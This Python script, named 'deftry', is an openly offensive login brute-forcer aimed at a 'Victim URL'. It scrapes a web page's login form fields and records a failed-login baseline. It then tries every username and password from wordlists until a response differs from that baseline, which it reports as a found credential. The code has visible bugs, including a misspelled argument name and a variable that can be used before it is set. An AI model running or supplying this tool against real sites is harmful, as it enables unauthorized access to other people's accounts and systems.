#!/usr/bin/python3

import requests
import re
import argparse
import signal
import sys
from pwn import *
from replit import clear


# Global Variables

class fg:
    BLACK   = '\033[30m'
    RED     = '\033[31m'
    GREEN   = '\033[32m'
    YELLOW  = '\033[33m'
    BLUE    = '\033[34m'
    MAGENTA = '\033[35m'
    CYAN    = '\033[36m'
    WHITE   = '\033[37m'
    RESET   = '\033[39m'

oneliner = "                                         \r"

# Tool

def parse_flags():
    parser = argparse.ArgumentParser(description='Default Credentials Checker')
    parser.add_argument('-u', required=True, help='URL', dest="url", metavar="[Victim URL]")
    parser.add_argument('-p', required=False, help='POST url', dest="post", metavar="[POST url]")
    parser.add_argument('-uw', required=False, help='Users Wordlist (Must be a list with value per line)', dest="inputuserdic", default=None, metavar="[/usr/share/example]")
    parser.add_argument('-pw', required=False, help='Password Wordlist (Must be a list with value per line)', dest="inputpassdic", default=None, metavar="[/usr/share/example]")
    parser.add_argument('-nc', required=False, help='No errors checks to compare', dest="nocheck", metavar="")
    args = parser.parse_args()
    return args


# Manage connections
def conn(url, method, payload=None):
    if method == "post":
        r = requests.post(url, data=payload)
    elif method == "get":
        r = requests.get(url)
    return r


# Prevent relative path python issues
def abspath(file):
    path = __file__
    if "\\" in path:
        path = path.replace("\\", "/")
    path = path.split("/")
    del path[-1]
    path = "/".join(path) + "/" + file
    return path


# Make the payloads to send
def make_payload(user_field="username", pwd_field="password", username="IfThisLoginIKillMyself", password="IfThisLoginIKillMyself"):
    payload = {
         f"{user_field}": f"{username}",
         f"{pwd_field}": f"{password}"
    }
    return payload


# Read dictionaries
def read_dict(dic):
    dictlist = []
    with open(dic, "r") as dict:
        for line in dict:
            dictlist.append(line.replace("\n", ""))
        dict.close
    return dictlist


# Field manager
def match_field(field, dic):
    dict = read_dict(dic)
    for i in field:
        for n in dict:
            if i == n:
                matched_field = i
            else:
                continue
    return matched_field


def choice(field):
    while True:
        try:
            for i in range(0, len(field)):
                print(f"{fg.CYAN}[{i}]:{fg.RESET} {fg.YELLOW}{field[i]}{fg.RESET}")
            selec = int(input(f"{fg.BLUE}Pick with numbers: {fg.RESET}"))
            print("\n")
            fselec = field[selec]
            break
        except ValueError:
            print(f"You need to choice with numbers...")
    return fselec


def no_empty(field):
    fields = []
    for i in field:
        n = re.findall(r".*?=\"(.*?)\"", i)
        if len(n[0]) != 0:
            fields.append(i)
        else:
            continue
    return fields


def get_fields(args, usr, pwd):
    p1 = log.progress(f'{fg.YELLOW}Searching login fields{fg.RESET}')
    url = args.url
    login = conn(url, "get")
    #usr_field = re.findall(r"<input type=\"text\" name=\"(.*?)\"", login.text)
    usr_element = re.findall(r"<input type=\"text\".*?name=\".*?\".*?>", login.text)
    #pass_field = re.findall(r"<input type=\"password\" name=\"(.*?)\"", login.text)
    pass_element = re.findall(r"<input type=\"password\".*?name=\".*?\".*?>", login.text)
    usr_field = re.findall(r" (.*?=\".*?\")", usr_element[0])
    pass_field = re.findall(r" (.*?=\".*?\")", pass_element[0])
    usr_field = no_empty(usr_field)
    pass_field = no_empty(pass_field)
    if len(usr_field) > 1:
        print(f"{fg.BLUE}More than 1 element for username match!!{fg.RESET}\n")
        listlen = len(usr_field) + 4
        usr_field = choice(usr_field)
        p1.status(f"{fg.RED}{usr_field}{fg.RESET}")
        for i in range(listlen, -1, -1):
            sys.stdout.write("\033[F")
    if len(pass_field) > 1:
        print(f"{fg.BLUE}More than 1 element for password match!!{fg.RESET}\n")
        listlen = len(pass_field) + 4
        pass_field = choice(pass_field)
        p1.status(f"{fg.RED}{usr_field}{fg.RESET}{fg.YELLOW}:{fg.RESET}{fg.RED}{pass_field}{fg.RESET}")
        for i in range(listlen, -1, -1):
            sys.stdout.write("\033[F")
    else:
        if usr_field == None:
            usr_field = match_field(usr_field, usr)
        elif pass_field == None:
            pass_field = match_field(pass_field, pwd)
    if usr_field == None or pass_field == None:
        print(f"\n\n\n{fg.RED}[!] Cant find any good login field, sorry...\n{fg.RESET}"); exit(1)
    usr_field = re.findall(r".*?=\"(.*?)\"", usr_field)
    pass_field = re.findall(r".*?=\"(.*?)\"", pass_field)
    p1.success(f': {fg.GREEN}Got the correct fields lucky bastard!: ' + f"\"{usr_field[0]}\" & \"{pass_field[0]}\"\n{fg.RESET}")
    
    return (usr_field[0], pass_field[0])

   
def get_error_values(response):
    error_chars = len(response.text)
    error_lines = len(response.text.splitlines())
    errors = {
        "chars": error_chars,
        "lines": error_lines
     }
    return errors
    

def check_errors(r, errors):
    r_err = get_error_values(r)
    chars = abs(r_err["chars"] - errors["chars"])
    lines = abs(r_err["lines"] - errors["lines"])
    if chars > 20 or lines > 3:
        return True
    else:
        return False


def brute_force(usr_field, pass_field, url, usrdic, passdic, errors):
    p2 = log.progress(f'{fg.YELLOW}Applying brute force{fg.YELLOW}')
    userdict = read_dict(usrdic)
    passdict = read_dict(passdic)
    for user in userdict:
        for passw in passdict:
            payload = make_payload(usr_field, pass_field, user, passw)
            print(f'{fg.YELLOW}Trying {fg.RESET}' + f"{fg.RED}{payload[f'{usr_field}']}:{payload[f'{pass_field}']}{fg.RESET}", end="")
            response = conn(url, "post", payload)
            print(oneliner, end="")
            if errors != None:
                check = check_errors(response, errors)
                if check == True:
                    p2.success(f"{fg.GREEN}Gotcha!!: {fg.RESET}{fg.GREEN}{payload[f'{usr_field}']}:{payload[f'{pass_field}']}{fg.RESET}")
                    break
                else:
                    continue
        if check == True:
            break
def main():
    # Print Headers and read flags
    print(f"\n{fg.MAGENTA}[*] Welcome to deftry{fg.RESET}")
    print(f"{fg.MAGENTA}_{fg.RESET}" * 30 + "\n")
    args = parse_flags()
    
    # Prepare dictionaries
    usrdic = abspath("wordlists/usr.txt")
    passdic = abspath("wordlists/pass.txt")
    usrfielddic = abspath("wordlists/usermatch.txt")
    passfielddic = abspath("wordlists/usermatch.txt")
    if args.inputuserdic:
        usrdic = args.inputuserdic
    elif args.inputpassdic:
        passdic = args.inputpassidc
    
    # Get the correct fields
    if args.post:
        usr_field, pass_field = get_fields(args, usrfielddic, passfielddic)
        if not "/" in args.post:
            args.post = "/" + args.post
        args.url = args.url + args.post
    else:
        usr_field, pass_field = get_fields(args, usrfielddic, passfielddic)
    if not args.nocheck:  # This is if user dont want to check the response for autodetect a correct input
        error_payload = make_payload(usr_field, pass_field)
        err_response = conn(args.url, "post", error_payload)
        errors = get_error_values(err_response)
    else:
        errors= None
    # Start the brute force
    brute_force(usr_field, pass_field, args.url, usrdic, passdic, errors)


# Ctrl C controled exit
def def_handler(sig, frame):
	print(f"\n\n\n{fg.RED}[!] Saliendo...{fg.RESET}\n")
	exit(1)



if __name__ == "__main__":
    clear()
    signal.signal(signal.SIGINT, def_handler)
    main()